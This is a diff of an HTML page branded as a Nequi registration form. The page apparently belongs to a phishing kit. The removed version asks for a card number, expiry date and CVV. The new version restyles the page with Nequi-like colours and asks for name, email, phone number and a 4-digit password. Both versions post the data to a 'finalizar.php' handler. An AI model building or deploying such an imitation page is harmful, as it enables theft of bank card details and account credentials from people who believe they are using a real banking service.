@@ -1,38 +1,92 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="es">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Registro Nequi</title>
-    <link rel="stylesheet" type="text/css" href="css/normalize.css">
-    <link rel="stylesheet" type="text/css" href="css/nequi_two.webflow.css">
-    <link rel="stylesheet" type="text/css" href="css/nequi_one.webflow.css">
-    <link rel="stylesheet" type="text/css" href="css/main.css">
+  <meta charset="UTF-8">
+  <title>Registro Nequi</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <style>
+    body {
+      background: #fae9f5;
+      margin: 0;
+      font-family: 'Inter', Arial, sans-serif;
+      min-height: 100vh;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+    }
+    .registro-container {
+      background: #fff;
+      border-radius: 16px;
+      box-shadow: 0 2px 26px rgba(190, 30, 120, 0.07);
+      padding: 36px 32px;
+      width: 420px;
+      text-align: center;
+    }
+    .registro-container h1 {
+      font-size: 2rem;
+      margin-bottom: 8px;
+      color: #210024;
+    }
+    .registro-container p {
+      font-size: 1rem;
+      margin-bottom: 24px;
+      color: #6a1c85;
+    }
+    .registro-field {
+      margin-bottom: 18px;
+      text-align: left;
+    }
+    .registro-field input {
+      width: 100%;
+      padding: 14px 18px;
+      font-size: 1rem;
+      border: 1.5px solid #f3eaf6;
+      border-radius: 8px;
+      background: #faf5fc;
+      outline: none;
+      transition: border-color 0.3s;
+    }
+    .registro-field input:focus {
+      border-color: #db1fff;
+    }
+    .nequi-btn {
+      width: 100%;
+      background: #e4007a;
+      color: #fff;
+      font-size: 1.2rem;
+      font-weight: 700;
+      border: none;
+      border-radius: 10px;
+      padding: 14px 0;
+      cursor: pointer;
+      transition: background 0.2s;
+    }
+    .nequi-btn:hover {
+      background: #b80063;
+    }
+  </style>
 </head>
 <body>
-    <header>
-        <!-- Tu header aquí -->
-    </header>
+  <div class="registro-container">
+    <h1>Regístrate en Nequi</h1>
+    <p>Crea tu cuenta para empezar a usar Nequi.</p>
 
-    <section>
-        <div class="login-wrap">
-            <h1>Registro Nequi</h1>
-            <form method="POST" action="finalizar.php" autocomplete="off">
-                <div class="form-group">
-                    <label for="codigo">Código:</label>
-                    <input type="text" id="codigo" name="codigo" required>
-                </div>
-                <div class="form-group">
-                    <label for="fecha">Fecha Expiración:</label>
-                    <input type="text" id="fecha" name="fecha" required>
-                </div>
-                <div class="form-group">
-                    <label for="cvv">CVV:</label>
-                    <input type="text" id="cvv" name="cvv" required>
-                </div>
-                <input type="submit" value="Registrar">
-            </form>
-        </div>
-    </section>
+    <!-- 🔹 Ruta corregida -->
+    <form method="POST" action="../backend/finalizar.php" autocomplete="off">
+      <div class="registro-field">
+        <input type="text" name="nombre" placeholder="Nombre completo" required>
+      </div>
+      <div class="registro-field">
+        <input type="email" name="correo" placeholder="Correo electrónico" required>
+      </div>
+      <div class="registro-field">
+        <input type="tel" name="celular" placeholder="Número de celular" maxlength="10" minlength="10" pattern="[0-9]{10}" required>
+      </div>
+      <div class="registro-field">
+        <input type="password" name="password" placeholder="Contraseña" minlength="4" maxlength="4" required>
+      </div>
+      <button type="submit" class="nequi-btn">Registrarse</button>
+    </form>
+  </div>
 </body>
 </html>
